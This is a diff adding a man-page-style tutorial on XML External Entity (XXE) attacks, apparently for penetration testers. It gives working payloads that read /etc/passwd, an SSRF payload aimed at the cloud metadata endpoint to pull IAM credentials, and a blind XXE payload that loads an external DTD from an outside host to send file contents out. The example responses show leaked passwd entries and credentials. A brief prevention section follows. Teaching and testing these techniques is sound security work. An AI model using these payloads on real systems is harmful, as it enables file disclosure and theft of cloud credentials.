@@ -1,0 +1,309 @@
+XXE(7)                    Miscellaneous Information Manual                    XXE(7)
+
+NAME
+       xxe - overview of XML External Entity vulnerability and exploitation
+       techniques
+
+DESCRIPTION
+       XML External Entity (XXE) is a critical vulnerability that can allow an
+       attacker to interact with data processing within an application.  This
+       vulnerability can lead an attacker to access the internal filesystem of
+       the application or the server, backend system, and many more critical
+       resources.
+
+       When discussing data transmission between website and server, XML and JSON
+       are the two main technologies that play into existence.  An application
+       that follows the process of data transmission using the standard library
+       or API, but for XXE vulnerabilities there are some predefined and
+       potentially dangerous functions that are enabled by default can leverage
+       critical bugs which leads to a maximum data breach.
+
+   XML Overview
+       XML stands for "extensible markup language" and this language is designed
+       for storing and transporting data.  Like HTML, XML follows the tree-like
+       structure but this language does not support predefined tags; we have to
+       create the tags according to the descriptive words.
+
+       The XML document type definition (DTD) contains declarations that can
+       define the structure of an XML document.  The DTD is declared with the
+       DOCTYPE element at the start of the XML document.
+
+       An External entity will look like:
+
+              <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
+
+       This feature is External Entity.  As mentioned above, DTD files are the
+       special creatures that tell about the format or structure of XML data.
+       The DTD file contains an element called ENTITY.
+
+       For more details on XML entities, see:
+       ⟨https://gist.github.com/RAJANAGORI/8700aa5343c03c38eb3a1dbaf13216c6/raw/22f9a976ab7797d953b929da4903563f70e03585/Entity.md⟩
+       ```gist:https://gist.github.com/RAJANAGORI/8700aa5343c03c38eb3a1dbaf13216c6/raw/22f9a976ab7797d953b929da4903563f70e03585/Entity.md
+       <?xml version="1.0" encoding="ISO-8859-1"?>
+       <!DOCTYPE example [
+       <!ELEMENT example ANY >
+       <!ENTITY file SYSTEM "file:///etc/passwd" >
+       ]>
+       <configuration>&file;</configuration>
+       ```
+
+   Exploitation Methods
+       There are three main ways to exploit XXE vulnerabilities:
+
+       1. Exploit XXE to access the internal file system
+       2. Exploit XXE to perform SSRF (Server Side Request Forgery)
+       3. Exploit blind XXE to data exportation
+
+   Internal File-system Exploitation using XXE
+       This method allows an attacker to read files from the server's internal
+       filesystem.
+
+       Steps to exploit:
+
+       1. Intercept the request (should be POST)
+       2. Check the content type:
+              •  If content-type is application/xml, it may be a win-win
+                 situation
+              •  If content-type is application/json, convert it to XML and try
+                 to check the response
+
+       Content Type Conversion
+              You can change the content type using the Burp Suite extension:
+              ⟨https://github.com/PortSwigger/content-type-converter⟩
+
+       3. Insert the external entity definition between the XML declaration and
+          element of the structure.  See example:
+              ⟨https://gist.github.com/RAJANAGORI/719d04988a416baef93fe99605059ed7/raw/25000f5bd4cdc4ed38d4634ce689ad78186b69/external_entity.md⟩
+              ```gist:https://gist.github.com/RAJANAGORI/719d04988a416baef93fe99605059ed7/raw/25000f5bd4cdc4ed38d4634ce689ad78186b69/external_entity.md
+              (External entity example - gist content not available)
+              ```
+
+       4. Mention the reference of the external entity from any value to &xxe;
+
+       5. Send the manipulated request to the repeater and check the response
+          for the bad request or the 400 status code.
+
+       Example Request
+              See the gist for the request parameter:
+              ⟨https://gist.github.com/RAJANAGORI/89ef74d9152787cc194d7e3af9816aef/raw/034d6a36ddc1828fb8646f3c960d6448fd53a9d9/request.xml⟩
+              ```gist:https://gist.github.com/RAJANAGORI/89ef74d9152787cc194d7e3af9816aef/raw/034d6a36ddc1828fb8646f3c960d6448fd53a9d9/request.xml
+              POST /some/url-stock HTTP/1.1
+              Host: exmaple.com
+              User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
+              Accept: */*
+              Accept-Language: en-US,en;q=0.5
+              Accept-Encoding: gzip, deflate
+              Referer: https://exmaple.com/product?productId=1
+              Content-Type: application/xml
+              Origin: https://exmaple.com
+              Content-Length: 186
+              Connection: close
+              Cookie: session=ikFBCBSXvCIrtROUpnGcvLp1CQBbkTYE
+              Sec-Fetch-Dest: empty
+              Sec-Fetch-Mode: cors
+              Sec-Fetch-Site: same-origin
+
+              <?xml version="1.0" encoding="UTF-8"?>
+              <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+              <stock>
+                <pId>
+                  &xxe;
+              </pId>
+               <sId>
+                  &xxe;
+               </sId>
+              </stock>
+              ```
+
+       Example Response
+              See the gist for the crafted response:
+              ⟨https://gist.github.com/RAJANAGORI/b917b87610dd8c040b5957fa7b023b60/raw/799dd0e634fc4705a17705ba07ba5b03217225f1/request.md⟩
+              ```gist:https://gist.github.com/RAJANAGORI/b917b87610dd8c040b5957fa7b023b60/raw/799dd0e634fc4705a17705ba07ba5b03217225f1/request.md
+              HTTP/1.1 400 Bad Request
+              Content-Type: application/json; charset=utf-8
+              Connection: close
+              Content-Length: 1230
+
+              "Invalid product ID: 
+              root:x:0:0:root:/root:/bin/bash
+              daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+              bin:x:2:2:bin:/bin:/usr/sbin/nologin
+              sys:x:3:3:sys:/dev:/usr/sbin/nologin
+              sync:x:4:65534:sync:/bin:/bin/sync
+              games:x:5:60:games:/usr/games:/usr/sbin/nologin
+              man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+              lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+              mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+              news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+              uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+              proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+              www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+              backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+              ```
+
+   SSRF Exploitation using XXE
+       This method allows an attacker to perform Server Side Request Forgery
+       attacks by making the server send HTTP requests to arbitrary URLs.
+
+       In this exploitation method, you only need to change the external entity
+       and replace the local file directory with the arbitrary server URL.
+
+       Example Request
+              See the gist for SSRF request:
+              ⟨https://gist.github.com/RAJANAGORI/c4bb1064337fd24702aa2d331d066918/raw/25771701692aabedb26d205a91f8565f2f33ace4/ssrf_request.xml⟩
+              ```gist:https://gist.github.com/RAJANAGORI/c4bb1064337fd24702aa2d331d066918/raw/25771701692aabedb26d205a91f8565f2f33ace4/ssrf_request.xml
+              POST /some/url_stocks HTTP/1.1
+              Host: example.com
+              User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
+              Accept: */*
+              Accept-Language: en-US,en;q=0.5
+              Accept-Encoding: gzip, deflate
+              Referer: https://example.com/product?productId=2
+              Content-Type: application/xml
+              Origin: https://example.com
+              Content-Length: 233
+              Connection: close
+              Cookie: session=SZ8FFAzFhbo7qRXBrKwB6dvZLqC3b5OR
+              Sec-Fetch-Dest: empty
+              Sec-Fetch-Mode: cors
+              Sec-Fetch-Site: same-origin
+
+              <?xml version="1.0" encoding="UTF-8"?>
+               <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+              <stock>
+                <pId>
+                  &xxe;
+                </pId>
+                <sId>
+                  1
+                </sId>
+              </stock>
+              ```
+
+       Example Response
+              See the gist for SSRF response:
+              ⟨https://gist.github.com/RAJANAGORI/78114c1e9475eee12c3407e09d2338c1/raw/0f5a092c1a27436872b60eca1221cb4be6cae0f9/ssrf_response.md⟩
+              ```gist:https://gist.github.com/RAJANAGORI/78114c1e9475eee12c3407e09d2338c1/raw/0f5a092c1a27436872b60eca1221cb4be6cae0f9/ssrf_response.md
+              HTTP/1.1 400 Bad Request
+              Content-Type: application/json; charset=utf-8
+              Connection: close
+              Content-Length: 548
+
+              "Invalid product ID: 
+              {
+                "Code" : "Success",
+                "LastUpdated" : "2021-10-23T15:56:36.131716Z",
+                "Type" : "AWS-HMAC",
+                "AccessKeyId" : "RVZgMtHYHcibh2r70is9",
+                "SecretAccessKey" : "V9cALLTcML0ESQKNISmJkcOfioxr3WdE3Nio4asV",
+                "Token" : "pIXSf58N9WGtkMj4XoGQHobknNl4l116dhEi6PLYW5c6dqs8nhj6Rngn4StVrw3J7EYEAlMayjl9Mx7yVRlNwK3N6KbxuekcRL7jzecNaVfERlcYFX2Nmmy9xS0xHQHCGl5IRr7AAYX1oiPERt0byhDMfDqfFJ6AhSBC9jDh4Q5EIrhq8abDajO7SuYZqwcQHOQk3CW1bledcYfNrZYrcFS2pw39NHa6ETl75kyGRmHZfzIF7u8gzo82ZeQUKCJS",
+                "Expiration" : "2027-10-22T15:56:36.131716Z"
+              }
+              ```
+
+   Blind External Exploitation using XXE
+       Blind XXE occurs when an application is vulnerable to XXE but does not
+       return any defined value for the external entity in the response section.
+       In general, direct getting or retrieval of the information from the
+       server-side is not possible.
+
+       Logic Behind Blind XXE
+              To retrieve data in blind XXE scenarios:
+
+              1. Define an XML parameter, say file which refers to /etc/passwd
+              2. Define another entity for another XML parameter that will be
+                 responsible for the HTTP request
+              3. The server will make an outbound HTTP request containing the
+                 file contents
+
+       Practical Implementation
+              Example Request:
+              ⟨https://gist.github.com/RAJANAGORI/453cf41c66ea1d54307d937c5dc46e79/raw/d9192fdb97aa22ebb20c238a057afb0420c94e9d/request_blind.xml⟩
+              ```gist:https://gist.github.com/RAJANAGORI/453cf41c66ea1d54307d937c5dc46e79/raw/d9192fdb97aa22ebb20c238a057afb0420c94e9d/request_blind.xml
+              POST /some/url-stock HTTP/1.1
+              Host: example.com
+              User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
+              Accept: */*
+              Accept-Language: en-US,en;q=0.5
+              Accept-Encoding: gzip, deflate
+              Referer: https://example.com/product?productId=14
+              Content-Type: application/xml
+              Origin: https://example.com
+              Content-Length: 245
+              Connection: close
+              Cookie: session=w9w5rPe2Qt4kEbW2ZoiVaUSPtiLIEb3k
+              Sec-Fetch-Dest: empty
+              Sec-Fetch-Mode: cors
+              Sec-Fetch-Site: same-origin
+
+              <?xml version="1.0" encoding="UTF-8"?>
+              <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://payload-ac7d1f9b1ee23d93c048f4d901490052.example.net/exploit.dtd"> %xxe;]>
+              <stock>
+                <pId>
+                  14
+                </pId>
+                <sId>
+                  1
+                </sId>
+              </stock>
+              ```
+
+              Example Response:
+              ⟨https://gist.github.com/RAJANAGORI/797fc2ed00655f6a4dbfcb692a98501a/raw/081242757eed217949ee3284e63b4c4d88861936/response-blind.md⟩
+              ```gist:https://gist.github.com/RAJANAGORI/797fc2ed00655f6a4dbfcb692a98501a/raw/081242757eed217949ee3284e63b4c4d88861936/response-blind.md
+              HTTP/1.1 400 Bad Request
+              Content-Type: application/json; charset=utf-8
+              Connection: close
+              Content-Length: 15
+
+              "Parsing error"
+              ```
+
+       Visual Reference
+              For a visual representation of blind XXE exploitation, see:
+              ⟨./blogs/xxe/image.png⟩
+
+NOTES
+       Prevention Strategies
+
+       •  Always use less complex data transmission standards such as JSON
+          instead of XML when possible.
+
+       •  Disable the XML External Entity and DTD processing in the application
+          configuration.
+
+       •  Implementation of server-side input validation or whitelisting, filter
+          or sanitizing the data in order to prevent such attacks from
+          server-side.
+
+       •  Use a whitelist of allowed XML elements and attributes, rejecting any
+          that are not explicitly permitted.
+
+       •  Keep XML parsers and libraries up to date with the latest security
+          patches.
+
+       •  Use less complex parsers that do not support external entity
+          processing.
+
+       •  Implement Content Security Policy (CSP) and other security headers
+          to mitigate potential impacts.
+
+SEE ALSO
+       xml(7), ssrf(7), owasp-top10(7)
+
+       OWASP XXE Prevention Cheat Sheet:
+       ⟨https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html⟩
+
+       OWASP Top 10: ⟨https://owasp.org/www-project-top-ten/⟩
+
+       Burp Suite Content Type Converter:
+       ⟨https://github.com/PortSwigger/content-type-converter⟩
+
+COLOPHON
+       This page describes XML External Entity (XXE) vulnerability and
+       exploitation techniques.  For more information about web application
+       security, visit the OWASP website at ⟨https://owasp.org/⟩.
+
+       Additional Resources:
+       •  Nightingale Docker Environment for Penetration Testing:
+          ⟨https://github.com/RAJANAGORI/Nightingale⟩
